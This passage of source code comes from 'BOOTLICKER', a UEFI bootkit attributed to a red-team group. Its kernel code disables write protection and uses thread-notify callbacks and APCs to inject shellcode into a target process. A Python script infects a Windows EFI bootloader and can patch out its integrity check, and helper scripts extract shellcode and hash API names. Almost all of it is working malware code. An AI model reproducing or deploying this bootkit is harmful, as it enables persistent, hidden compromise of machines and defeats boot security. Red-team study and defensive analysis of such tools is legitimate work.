typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    UINT32   Characteristics;
    UINT32   TimeDateStamp;
    UINT32   ForwarderChain;
    UINT32   Name;
    PIMAGE_THUNK_DATA FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;

#endif

```

`kernel/ApcRoutine.c`:

```c
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef enum _KAPC_ENVIRONMENT
{
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment
} KAPC_ENVIRONMENT ;

BOOLEAN
NTAPI
KeInsertQueueApc(
	_In_ PRKAPC	Apc,
	_In_ PVOID	SystemArgument1,
	_In_ PVOID	SystemArgument2,
	_In_ KPRIORITY	Increment
);

VOID
NTAPI
KeInitializeApc(
	_In_ PRKAPC	Apc,
	_In_ PRKTHREAD	Thread,
	_In_ KAPC_ENVIRONMENT	Environment,
	_In_ PVOID	KernelRoutine,
	_In_ PVOID	RundownRoutine,
	_In_ PVOID	NormalRoutine,
	_In_ KPROCESSOR_MODE	ProcessMode,
	_In_ PVOID	NormalContext
);

typedef struct
{
	D_API( ZwAllocateVirtualMemory );
	D_API( PsGetCurrentThread );
	D_API( KeInsertQueueApc );
	D_API( KeInitializeApc );
	D_API( ExAllocatePool );
	D_API( ExFreePool );
	D_API( ZwClose );
} API ;

/* API Hashes */

#define H_API_ZWALLOCATEVIRTUALMEMORY		0xb20c09db /* ZwAllocateVirtualMemory */
#define H_API_PSGETCURRENTTHREAD		0xaef4ed03 /* PsGetCurrentThread */
#define H_API_KEINSERTQUEUEAPC			0xb406c5c3 /* KeInsertQueueApc */
#define H_API_KEINITIALIZEAPC			0x0dd2d23b /* KeInitializeApc */
#define H_API_EXALLOCATEPOOL			0xa1fe8ce1 /* ExAllocatePool */
#define H_API_EXFREEPOOL			0x3f7747de /* ExFreePool */	
#define H_API_ZWCLOSE				0xe391398c /* ZwClose */

/*!
 *
 * Purpose:
 *
 * Inserts a APC callback into the usermode process.
 *
!*/
D_SEC( D ) VOID NTAPI ApcNormalRoutine( _In_ PVOID NormalContext, _In_ PVOID SystemArgument1, _In_ PVOID SystemArgument2 )
{
	API	Api;
	SIZE_T	Len = 0;

	PVOID	Ptr = NULL;
	PKMTBL	Tbl = NULL;
	PRKAPC	Apc = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Tbl = C_PTR( G_PTR( KmTbl ) );

	Api.ZwAllocateVirtualMemory = PeGetFuncEat( Tbl->KernelBase, H_API_ZWALLOCATEVIRTUALMEMORY ); 
	Api.PsGetCurrentThread      = PeGetFuncEat( Tbl->KernelBase, H_API_PSGETCURRENTTHREAD );
	Api.KeInsertQueueApc        = PeGetFuncEat( Tbl->KernelBase, H_API_KEINSERTQUEUEAPC );
	Api.KeInitializeApc         = PeGetFuncEat( Tbl->KernelBase, H_API_KEINITIALIZEAPC );
	Api.ExAllocatePool          = PeGetFuncEat( Tbl->KernelBase, H_API_EXALLOCATEPOOL );
	Api.ExFreePool              = PeGetFuncEat( Tbl->KernelBase, H_API_EXFREEPOOL );

	/* Calculcate the length of the shellcode */
	Len = U_PTR( U_PTR( GetIp() ) + 11 ) - U_PTR( G_PTR( UmEnt ) );

	/* Allocate a buffer to hold the usermode shellcode */
	if ( NT_SUCCESS( Api.ZwAllocateVirtualMemory( NtCurrentProcess(), &Ptr, 0, &( SIZE_T ){ Len }, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) ) ) {
		/* Copy over the usermode shellcode */
		__builtin_memcpy( Ptr, C_PTR( G_PTR( UmEnt ) ), Len );

		/* Allocate a KAPC structure */
		if ( ( Apc = Api.ExAllocatePool( NonPagedPool, sizeof( KAPC ) ) ) != NULL ) {
			/* Initialize an APC */
			Api.KeInitializeApc( Apc, 
					     Api.PsGetCurrentThread(), 
					     CurrentApcEnvironment, 
					     C_PTR( G_PTR( ApcKernelRoutine ) ), 
					     NULL, 
					     Ptr, 
					     UserMode, 
					     NULL );

			/* Attempt to insert to the queue */
			if ( ! Api.KeInsertQueueApc( Apc, NULL, NULL, 0 ) ) {
				/* Free if failed! */
				Api.ExFreePool( Apc );
			};
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
};

/*!
 *
 * Purpose:
 *
 * Empty kernel APC routine thats executed for user
 * and kernel mode.
 *
!*/
D_SEC( D ) VOID NTAPI ApcKernelRoutine( _In_ PRKAPC Apc, _In_ PVOID* NormalRoutine, _In_ PVOID* NormalContext, _In_ PVOID* SystemArgument1, _In_ PVOID* SystemArgument2 ) 
{
	API	Api;
	PKMTBL	Tbl = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Get a pointer to the table */
	Tbl = C_PTR( G_PTR( KmTbl ) );

	Api.ExFreePool = PeGetFuncEat( Tbl->KernelBase, H_API_EXFREEPOOL );
	Api.ExFreePool( Apc );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
};

```

`kernel/ApcRoutine.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Inserts a APC callback into the usermode process.
 *
!*/
D_SEC( D ) VOID NTAPI ApcNormalRoutine( _In_ PVOID NormalContext, _In_ PVOID SystemArgument1, _In_ PVOID SystemArgument2 );

/*!
 *
 * Purpose:
 *
 * Empty kernel APC routine thats executed for user
 * and kernel mode.
 *
!*/
D_SEC( D ) VOID NTAPI ApcKernelRoutine( _In_ PRKAPC Apc, _In_ PVOID* NormalRoutine, _In_ PVOID* NormalContext, _In_ PVOID* SystemArgument1, _In_ PVOID* SystemArgument2 );

```

`kernel/Common.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

#include <intrin.h>
#include "ddk/ntddk.h"
#include "ddk/ntifs.h"
#include "ddk/ntimage.h"
#include "global/Macros.h"
#include "global/Labels.h"
#include "global/Hash.h"
#include "global/Pe.h"

#include "ThreadNotifyRoutine.h"
#include "ApcRoutine.h"
#include "KmTbl.h"

```

`kernel/KernelMain.c`:

```c
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( PsSetCreateThreadNotifyRoutine ); 
	D_API( KeSetSystemAffinityThread );
} API ;

/* API Hashes */
#define H_API_PSSETCREATETHREADNOTIFYROUTINE	0xbedbd03f /* PsSetCreateThreadNotifyRoutine */
#define H_API_KESETSYSTEMAFFINITYTHREAD		0x80679c78 /* KeSetSystemAffinityThread */

/*!
 *
 * Purpose:
 *
 * Inserts a thread notify routine to wait for
 * the process. Once the process starts, it 
 * inserts arbitrary code into the entrypoint 
 * of the process.
 *
!*/
D_SEC( D ) VOID NTAPI KernelMain( _In_ PVOID KernelBase, _In_ PVOID DriverBase )
{
	API	Api;

	PKMTBL			Kmt = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PVOID			Ptr = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Store info for later */
	Kmt = C_PTR( G_PTR( KmTbl ) );
	Kmt->KernelBase = C_PTR( KernelBase );

	/* Get API pointer */
	Api.PsSetCreateThreadNotifyRoutine = PeGetFuncEat( Kmt->KernelBase, H_API_PSSETCREATETHREADNOTIFYROUTINE );
	Api.KeSetSystemAffinityThread      = PeGetFuncEat( Kmt->KernelBase, H_API_KESETSYSTEMAFFINITYTHREAD );

	/* Get the first .text */
	Dos = C_PTR( DriverBase );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Sec = IMAGE_FIRST_SECTION( Nth );

	/* Get address of our image load notify routine */
	Ptr = C_PTR( U_PTR( Dos ) + Sec->VirtualAddress + Sec->SizeOfRawData );

	/* Force to 1 CPU */
	Api.KeSetSystemAffinityThread( 1 );

	/* Disable write protection */
	__writecr0( __readcr0() &~ 0x000010000 );

	/* Insert jump address */
	*( PUINT16 )( C_PTR( U_PTR( Ptr ) + 0x00 ) ) = ( UINT16 )( 0x25FF );
	*( PUINT32 )( C_PTR( U_PTR( Ptr ) + 0x02 ) ) = ( UINT32 )( 0 );
	*( PUINT64 )( C_PTR( U_PTR( Ptr ) + 0x06 ) ) = ( UINT64 )( C_PTR( G_PTR( ThreadNotifyRoutine ) ) );

	/* Insert write protection */
	__writecr0( __readcr0() | 0x000010000 );

	/* Add a notify routine */
	Api.PsSetCreateThreadNotifyRoutine( Ptr );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
};

```

`kernel/KmTbl.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

typedef struct __attribute__(( packed ))
{
	PVOID	KernelBase;
	ULONG	InitialRun;
} KMTBL, *PKMTBL ;

```

`kernel/ThreadNotifyRoutine.c`:

```c
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef enum _KAPC_ENVIRONMENT
{
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment
} KAPC_ENVIRONMENT ;

BOOLEAN
NTAPI
KeInsertQueueApc(
	_In_ PRKAPC	Apc,
	_In_ PVOID	SystemArgument1,
	_In_ PVOID	SystemArgument2,
	_In_ KPRIORITY	Increment
);

VOID
NTAPI
KeInitializeApc(
	_In_ PRKAPC	Apc,
	_In_ PRKTHREAD	Thread,
	_In_ KAPC_ENVIRONMENT	Environment,
	_In_ PVOID	KernelRoutine,
	_In_ PVOID	RundownRoutine,
	_In_ PVOID	NormalRoutine,
	_In_ KPROCESSOR_MODE	ProcessMode,
	_In_ PVOID	NormalContext
);

typedef struct
{
	D_API( PsLookupProcessByProcessId );
	D_API( ZwQueryInformationProcess );
	D_API( PsLookupThreadByThreadId );
	D_API( ObOpenObjectByPointer );
	D_API( ObDereferenceObject );
	D_API( PsIsSystemThread );
	D_API( KeInsertQueueApc );
	D_API( KeInitializeApc );
	D_API( ExAllocatePool );
	D_API( ExFreePool );
	D_API( ZwClose );
} API ;

/* API Hashes */

#define H_API_PSLOOKUPPROCESSBYPROCESSID	0x0009b1c8 /* PsLookupProcessByProcessId */
#define H_API_ZWQUERYINFORMATIONPROCESS		0x0abca671 /* ZwQueryInformationProcess */
#define H_API_PSLOOKUPTHREADBYTHREADID		0x5eb140fa /* PsLookupThreadByThreadId */
#define H_API_OBOPENOBJECTBYPOINTER		0x4a0128db /* ObOpenObjectByPointer */
#define H_API_OBDEREFERENCEOBJECT		0x3de33965 /* ObDereferenceObject */
#define H_API_PSISSYSTEMTHREAD			0x824ddfc1 /* PsIsSystemThread */
#define H_API_KEINSERTQUEUEAPC			0xb406c5c3 /* KeInsertQueueApc */
#define H_API_KEINITIALIZEAPC			0x0dd2d23b /* KeInitializeApc */
#define H_API_EXALLOCATEPOOL			0xa1fe8ce1 /* ExAllocatePool */
#define H_API_EXFREEPOOL			0x3f7747de /* ExFreePool */	
#define H_API_ZWCLOSE				0xe391398c /* ZwClose */

/*!
 *
 * Purpose:
 *
 * Determines if the host process is our target to 
 * insert an APC. The APC will then create allocate 
 * the usermode shellcode, and insert it within the
 * PEB entrypoint.
 *
!*/
D_SEC( D ) VOID WINAPI ThreadNotifyRoutine( _In_ HANDLE ProcessId, _In_ HANDLE ThreadId, _In_ BOOLEAN Create ) 
{
	API		Api;
	UNICODE_STRING	Uni;

	SIZE_T		Len = 0;
	
	PKPCR		Pcr = NULL;
	PKAPC		Apc = NULL;
	PKMTBL		Tbl = NULL;
	HANDLE		Hnd = NULL;
	PETHREAD	Thd = NULL;
	PEPROCESS	Prc = NULL;
	PUNICODE_STRING	Pth = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Get a pointer to the table */
	Tbl = C_PTR( G_PTR( KmTbl ) );

	Api.PsLookupProcessByProcessId = PeGetFuncEat( Tbl->KernelBase, H_API_PSLOOKUPPROCESSBYPROCESSID );
	Api.ZwQueryInformationProcess  = PeGetFuncEat( Tbl->KernelBase, H_API_ZWQUERYINFORMATIONPROCESS );
	Api.PsLookupThreadByThreadId   = PeGetFuncEat( Tbl->KernelBase, H_API_PSLOOKUPTHREADBYTHREADID );
	Api.ObOpenObjectByPointer      = PeGetFuncEat( Tbl->KernelBase, H_API_OBOPENOBJECTBYPOINTER );
	Api.ObDereferenceObject        = PeGetFuncEat( Tbl->KernelBase, H_API_OBDEREFERENCEOBJECT );
	Api.PsIsSystemThread           = PeGetFuncEat( Tbl->KernelBase, H_API_PSISSYSTEMTHREAD );
	Api.KeInsertQueueApc           = PeGetFuncEat( Tbl->KernelBase, H_API_KEINSERTQUEUEAPC );
	Api.KeInitializeApc            = PeGetFuncEat( Tbl->KernelBase, H_API_KEINITIALIZEAPC );
	Api.ExAllocatePool             = PeGetFuncEat( Tbl->KernelBase, H_API_EXALLOCATEPOOL );
	Api.ExFreePool                 = PeGetFuncEat( Tbl->KernelBase, H_API_EXFREEPOOL );
	Api.ZwClose                    = PeGetFuncEat( Tbl->KernelBase, H_API_ZWCLOSE );

	/* Get the process control routine */
	Pcr = C_PTR( __readgsqword( FIELD_OFFSET( KPCR, Self ) ) );

	/* Are we @ PASSIVE_LEVEL */
	if ( ! Pcr->Irql ) {

		if ( NT_SUCCESS( Api.PsLookupThreadByThreadId( ThreadId, &Thd ) ) ) {

			if ( ! Api.PsIsSystemThread( Thd ) ) {
				/* Get the EPROCESS object for the object */
				if ( NT_SUCCESS( Api.PsLookupProcessByProcessId( ProcessId, &Prc ) ) ) {
					/* Open a pseudo handle */
					if ( NT_SUCCESS( Api.ObOpenObjectByPointer( Prc, 0, NULL, 0, 0, KernelMode, &Hnd ) ) ) {
						/* Query length of the complete image name */
						if ( ! NT_SUCCESS( Api.ZwQueryInformationProcess( Hnd, ProcessImageFileName, NULL, 0, &Len ) ) ) {
							/* Allocate the buffer for the page */
							if ( ( Pth = Api.ExAllocatePool( NonPagedPool, Len ) ) != NULL ) {
								/* Query the complete image file name */
								if ( NT_SUCCESS( Api.ZwQueryInformationProcess( Hnd, ProcessImageFileName, Pth, Len, &Len ) ) ) {

									/* Enumerate from the top until we reach the path character */
									for ( USHORT Idx = ( Pth->Length / sizeof( WCHAR ) ) - 1 ; Idx != 0 ; --Idx ) {
										if ( Pth->Buffer[ Idx ] == L'\\' || Pth->Buffer[ Idx ] == L'/' ) {
											Uni.Buffer        = & Pth->Buffer[ Idx + 1 ];
											Uni.Length        = Pth->Length - ( Idx + 1 ) * sizeof( WCHAR );
											Uni.MaximumLength = Pth->MaximumLength - ( Idx + 1 ) * sizeof( WCHAR );
											break;
										};
									};

									/* Is this a our target? */
									if ( HashString( Uni.Buffer, Uni.Length ) == 0x0 ) {
										/* Have we already been run? */
										if ( InterlockedCompareExchange( &Tbl->InitialRun, TRUE, FALSE ) != TRUE ) {
											/* Allocate an APC */
											if ( ( Apc = Api.ExAllocatePool( NonPagedPool, sizeof( KAPC ) ) ) != NULL ) {	

												/* Initialize the APC */
												Api.KeInitializeApc( Apc, 
														     Thd, 
														     OriginalApcEnvironment, 
														     C_PTR( G_PTR( ApcKernelRoutine ) ),
														     NULL,
														     C_PTR( G_PTR( ApcNormalRoutine ) ),
														     KernelMode,
														     NULL );

												/* Attempt to queue. If we fail, free the pool */
												if ( ! Api.KeInsertQueueApc( Apc, NULL, NULL, 0 ) ) {
													/* Free the APC */
													Api.ExFreePool( Apc );
												};
											};
										};
									};
								};
								/* Free the path */
								Api.ExFreePool( Pth );
							};
						};
						/* Close the handle */
						Api.ZwClose( Hnd );
					};
					/* Decrement the count in the process */
					Api.ObDereferenceObject( Prc );
				};
			};
			Api.ObDereferenceObject( Thd );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};

```

`kernel/ThreadNotifyRoutine.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Determines if the host process is the target to 
 * insert an APC. The APC will then create allocate 
 * the usermode shellcode, and insert it within the
 * PEB entrypoint.
 *
!*/
D_SEC( D ) VOID WINAPI ThreadNotifyRoutine( _In_ HANDLE ProcessId, _In_ HANDLE ThreadId, _In_ BOOLEAN Create );

```

`python3/extract.py`:

```py
#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import pefile
import argparse

if __name__ in '__main__':
    try:
        parser = argparse.ArgumentParser( description = 'Extracts shellcode from a PE.' );
        parser.add_argument( '-f', required = True, help = 'Path to the source executable', type = str );
        parser.add_argument( '-o', required = True, help = 'Path to store the output raw binary', type = str );
        option = parser.parse_args();

        PeExe = pefile.PE( option.f );
        PeSec = PeExe.sections[0].get_data();

        if PeSec.find( b'ENDOFCODE' ) != None:
            ScRaw = PeSec[ : PeSec.find( b'ENDOFCODE' ) ];
            f = open( option.o, 'wb+' );
            f.write( ScRaw );
            f.close();
        else:
            print('[!] error: no ending tag');
    except Exception as e:
        print( '[!] error: {}'.format( e ) );


```

`python3/hashstring.py`:

```py
#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import sys

def hash_string( string ):
    try:
        hash = 5381

        for x in string.upper():
            hash = (( hash << 5 ) + hash ) + ord(x)

        return hash & 0xFFFFFFFF
    except:
        pass

if __name__ in '__main__':
    try:
        print('0x%x' % hash_string(sys.argv[1]));
    except IndexError:
        print('usage: %s [string]' % sys.argv[0]);

```

`python3/inject.py`:

```py
#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import io
import os
import lief
import pefile
import struct
import argparse
import requests
import pdbparse

def GetPeSym( PePath, Symbol ):
    """
    Extract the symbol from the PE based on its PDB.
    """
    try:
        Pef = pefile.PE( PePath );

        for Dir in Pef.DIRECTORY_ENTRY_DEBUG:
            if hasattr( Dir.entry, 'PdbFileName' ):
                ##
                ## Extract GUID
                ##
                uid  = f'{Dir.entry.Signature_Data1:08x}';
                uid += f'{Dir.entry.Signature_Data2:04x}';
                uid += f'{Dir.entry.Signature_Data3:04x}';
                uid += f'{int.from_bytes(Dir.entry.Signature_Data4, byteorder="big"):016x}'
                uid  = uid.upper();

                ##
                ## Get URL and Object
                ##
                url  = f'https://msdl.microsoft.com/download/symbols/'
                url += f'{Dir.entry.PdbFileName[:-1].decode("ascii")}/{uid}{Dir.entry.Age:x}/'
                url += f'{Dir.entry.PdbFileName[:-1].decode("ascii")}'
                req  = requests.get( url );
                iop  = io.BytesIO( bytes( req.content ) );

                try:
                    ##
                    ## Get Object
                    ##
                    obj = pdbparse.PDB7( iop );
                except:
                    ##
                    ## Get Object
                    ##
                    obj = pdbparse.PDB2( iop );

                try:
                    ##
                    ## Get Section
                    ##
                    sec = obj.STREAM_SECT_HDR_ORIG.sections;
                except:
                    ##
                    ## Get Section
                    ##
                    sec = obj.STREAM_SECT_HDR.sections;

                try:
                    for ent in obj.STREAM_GSYM.reload().globals:
                        if ent.name == Symbol:
                            return ent;
                except:
                    return 0;
    except:
        return 0;

if __name__ in '__main__':
    """
    Injects a EFI driver with the bootkit
    """
    Opt = argparse.ArgumentParser( description = 'Infects a EFI image with the bootkit' );
    Opt.add_argument( '-ef', help = 'Path to the old EFI bootloader.', required = True, type = str );
    Opt.add_argument( '-sc', help = 'Path to the shellcode', required = True, type = argparse.FileType( 'rb+' ) );
    Opt.add_argument( '-of', help = 'Path to the new EFI bootloader.', required = True, type = str );
    Opt.add_argument( '--patch-integrity', help = 'Patch the integrity check in bootmgfw.efi.', required = False, action = 'store_true', default = False );
    Arg = Opt.parse_args();

    ##
    ## Parse PE
    ##
    Obj = lief.parse( Arg.ef );
    
    ##
    ## Add Config
    ##
    Cfg  = struct.pack( '>I', Obj.optional_header.addressof_entrypoint );
    Cfg += struct.pack( '>I', Obj.dos_header.addressof_new_exeheader );

    ##
    ## Add EFI Section
    ##
    Sec = lief.PE.Section( ".efi" );
    Sec.characteristics = lief.PE.SECTION_CHARACTERISTICS.MEM_EXECUTE | lief.PE.SECTION_CHARACTERISTICS.MEM_WRITE | lief.PE.SECTION_CHARACTERISTICS.MEM_READ;
    Sec.content = list( Arg.sc.read() + Cfg );
    Sec = Obj.add_section( Sec );

    ##
    ## Patch Self Integrity
    ##
    if Arg.patch_integrity:
        ##
        ## Inserts a mov eax, 0; ret
        ## 
        Ent = GetPeSym( Arg.ef, "BmFwVerifySelfIntegrity" );
        Obj.patch_address( Ent.offset + Obj.sections[ Ent.segment - 1 ].virtual_address, list( b"\x33\xc0\xc3" ) );

    ##
    ## Patch entrypoint
    ## 
    Obj.optional_header.addressof_entrypoint = Sec.virtual_address;
    
    ##
    ## Build new bootloader
    ##
    Bld = lief.PE.Builder( Obj );
    Bld.build( );
    Bld.write( Arg.of );

```

`usermode/Common.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

#define SECURITY_WIN32
#include <windows.h>
#include <ntstatus.h>
#include "global/Macros.h"
#include "global/Labels.h"
#include "global/Hash.h"
#include "global/Pe.h"
#include "Native.h"

```

`usermode/Native.h`:

```h
/*
	ntdll.h
	User Mode, 32bit & 64bit version
	Visual Studio 6.0 - Visual Studio 2010 and MingW compatible
	Intel C++ Compiler (ICL) 11.x - 12.x prefered

	(c) 2019 - Rokas Kupstys
	(c) 2009, 2010, 2011 - Fyyre
	(c) 2011 - 2012 EP_X0FF
	(c) 2011 - rndbit

	version 1.26 ( increment this if changes has global effect )
	please mark your changes date begin / date end comments

	last change 04/01/2012

	note: Please use _M_X86/_M_X64 for if(n)def/endif conditionals, instead of WIN32/WIN64.
*/

#if !defined(_NTDLL_)
#define _NTDLL_

#pragma warning( disable:4001 )	// level 4 error - nonstandard extension 'single line comment' was used
#pragma warning( disable:4201 )	// level 4 error - nonstandard extension used : nameless struct/union - ANSI C violation
#pragma warning( disable:4214 ) // level 4 error - nonstandard extension used : bit field types other than int - ANSI C violation

#if defined(__ICL)
#pragma warning ( disable : 344 )
#endif

#pragma pack( push, 8 )

#if defined(__cplusplus)
extern "C" {
#endif

#include <wtypes.h>
#include <basetsd.h>

#if !defined(NTSTATUS)
typedef LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

#if !defined(SECURITY_STATUS)
typedef LONG SECURITY_STATUS;
#endif

#define EXPORT_FN __declspec(dllexport)
#define IMPORT_FN __declspec(dllimport)

#define PAGE_SIZE 0x1000

#define EXTERNAL extern "C"

#ifndef UNREFERENCED_PARAMETER
#define UNREFERENCED_PARAMETER(P)	(P)
#endif

#include "ntstatus.h"

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NT_INFORMATION(Status) ((ULONG)(Status) >> 30 == 1)
#define NT_WARNING(Status) ((ULONG)(Status) >> 30 == 2)
#define NT_ERROR(Status) ((ULONG)(Status) >> 30 == 3)

#define ABSOLUTE_TIME(wait) (wait)
#define RELATIVE_TIME(wait) (-(wait))
#define NANOSECONDS(nanos)      \
    (((signed __int64)(nanos)) / 100L)
#define MICROSECONDS(micros)    \
    (((signed __int64)(micros)) * NANOSECONDS(1000L))
#define MILLISECONDS(milli)     \
    (((signed __int64)(milli)) * MICROSECONDS(1000L))
#define SECONDS(seconds)        \
    (((signed __int64)(seconds)) * MILLISECONDS(1000L))

#define ARGUMENT_PRESENT(ArgumentPointer)    (\
	(CHAR *)((ULONG_PTR)(ArgumentPointer)) != (CHAR *)(NULL) )

#define RESTORE_LIST(ListEntry) \
	ListEntry.Flink = ListEntry.Flink; \
	ListEntry.Blink = ListEntry.Blink

#define UNLINK(x) (x).Blink->Flink = (x).Flink; \
	(x).Flink->Blink = (x).Blink;

#define ALIGN_TO_POWER2( x, n ) (((ULONG)(x) + ((n)-1)) & ~((ULONG)(n)-1))

#define POI(addr) *(ULONG *)(addr)

#define IS_PATH_SEPARATOR(ch) ((ch == '\\') || (ch == '/'))
#define IS_DOT(s) ( s[0] == '.' && ( IS_PATH_SEPARATOR(s[1]) || s[1] == '\0') )
#define IS_DOT_DOT(s) ( s[0] == '.' && s[1] == '.' && ( IS_PATH_SEPARATOR(s[2]) || s[2] == '\0') )

#define IS_PATH_SEPARATOR_U(ch) ((ch == (WCHAR)'\\') || (ch == (WCHAR)'/'))
#define IS_DOT_U(s) ( s[0] == (WCHAR)'.' && ( IS_PATH_SEPARATOR_U(s[1]) || s[1] == UNICODE_NULL) )
#define IS_DOT_DOT_U(s) ( s[0] == (WCHAR)'.' && s[1] == (WCHAR)'.' && ( IS_PATH_SEPARATOR_U(s[2]) || s[2] == UNICODE_NULL) )

#define jmp_length(y,x) ((x-y)-5)
#define stc_jc(y,x) ((x-y)-7)

#define MODIFYBYTE( _base, _offset, _byte ) { ((unsigned char *)_base)[_offset] = (unsigned char)_byte; }
#define MODIFYWORD( _base, _offset, _word ) { ((unsigned short *)_base)[_offset] = (unsigned short)_word; }
#define MODIFYDWORD( _base, _offset, _dword ) { ((unsigned long *)_base)[_offset] = (unsigned long)_dword; }
#define MODIFYQWORD( _base, _offset, _qword ) { ((unsigned long long *)_base)[_offset] = (unsigned long long)_qword; }

#define PTR_ADD_OFFSET(Pointer, Offset) ((PVOID)((ULONG_PTR)(Pointer) + (ULONG_PTR)(Offset)))

#define WRITE_JMP( from, to ) { ((PCHAR)from)[0] = (CHAR)0xE9; *((ULONG_PTR *)&(((PCHAR)(from))[1])) = (PCHAR)(to) - (PCHAR)(from) - 5; }
#define GET_JMP( from ) (((PCHAR)from)[0]==(CHAR)0xE9)? (*((ULONG_PTR *)&(((PCHAR)(from))[1])) + 5 + (ULONG_PTR)(from)) : 0

#define ASSERT( exp )	((void) 0)

//
// The following macros store and retrieve USHORTS and ULONGS from potentially unaligned addresses, avoiding alignment faults.
//

// 31.05.2011 - added the following macros
#define SHORT_SIZE		(sizeof(USHORT))
#define SHORT_MASK		(SHORT_SIZE - 1)
#define LONG_SIZE			(sizeof(LONG))
#define LONG_MASK			(LONG_SIZE - 1)
#define LOWBYTE_MASK	0x00FF

#define FIRSTBYTE(VALUE)  (VALUE & LOWBYTE_MASK)
#define SECONDBYTE(VALUE) ((VALUE >> 8) & LOWBYTE_MASK)
#define THIRDBYTE(VALUE)  ((VALUE >> 16) & LOWBYTE_MASK)
#define FOURTHBYTE(VALUE) ((VALUE >> 24) & LOWBYTE_MASK)

//
// if MIPS Big Endian, order of bytes is reversed.
//

#define SHORT_LEAST_SIGNIFICANT_BIT			0
#define SHORT_MOST_SIGNIFICANT_BIT			1

#define LONG_LEAST_SIGNIFICANT_BIT			0
#define LONG_3RD_MOST_SIGNIFICANT_BIT		1
#define LONG_2ND_MOST_SIGNIFICANT_BIT		2
#define LONG_MOST_SIGNIFICANT_BIT				3

//++
//
// VOID
// RtlStoreUshort (
//     PUSHORT ADDRESS
//     USHORT VALUE
//     )
//
// Routine Description:
//
// This macro stores a USHORT value in at a particular address, avoiding
// alignment faults.
//
// Arguments:
//
//     ADDRESS - where to store USHORT value
//     VALUE - USHORT to store
//
// Return Value:
//
//     none.
//
//--

#define RtlStoreUshort(ADDRESS,VALUE)                     \
         if ((ULONG_PTR)ADDRESS & SHORT_MASK) {               \
             ((PUCHAR) ADDRESS)[SHORT_LEAST_SIGNIFICANT_BIT] = (UCHAR)(FIRSTBYTE(VALUE));    \
             ((PUCHAR) ADDRESS)[SHORT_MOST_SIGNIFICANT_BIT ] = (UCHAR)(SECONDBYTE(VALUE));   \
         }                                                \
         else {                                           \
             *((PUSHORT) ADDRESS) = (USHORT) VALUE;       \
         }


//++
//
// VOID
// RtlStoreUlong (
//     PULONG ADDRESS
//     ULONG VALUE
//     )
//
// Routine Description:
//
// This macro stores a ULONG value in at a particular address, avoiding
// alignment faults.
//
// Arguments:
//
//     ADDRESS - where to store ULONG value
//     VALUE - ULONG to store
//
// Return Value:
//
//     none.
//
// Note:
//     Depending on the machine, we might want to call storeushort in the
//     unaligned case.
//
//--

#define RtlStoreUlong(ADDRESS,VALUE)                      \
         if ((ULONG_PTR)ADDRESS & LONG_MASK) {                \
             ((PUCHAR) ADDRESS)[LONG_LEAST_SIGNIFICANT_BIT      ] = (UCHAR)(FIRSTBYTE(VALUE));    \
             ((PUCHAR) ADDRESS)[LONG_3RD_MOST_SIGNIFICANT_BIT   ] = (UCHAR)(SECONDBYTE(VALUE));   \
             ((PUCHAR) ADDRESS)[LONG_2ND_MOST_SIGNIFICANT_BIT   ] = (UCHAR)(THIRDBYTE(VALUE));    \
             ((PUCHAR) ADDRESS)[LONG_MOST_SIGNIFICANT_BIT       ] = (UCHAR)(FOURTHBYTE(VALUE));   \
         }                                                \
         else {                                           \
             *((PULONG) ADDRESS) = (ULONG) VALUE;         \
         }

//++
//
// VOID
// RtlRetrieveUshort (
//     PUSHORT DESTINATION_ADDRESS
//     PUSHORT SOURCE_ADDRESS
//     )
//
// Routine Description:
//
// This macro retrieves a USHORT value from the SOURCE address, avoiding
// alignment faults.  The DESTINATION address is assumed to be aligned.
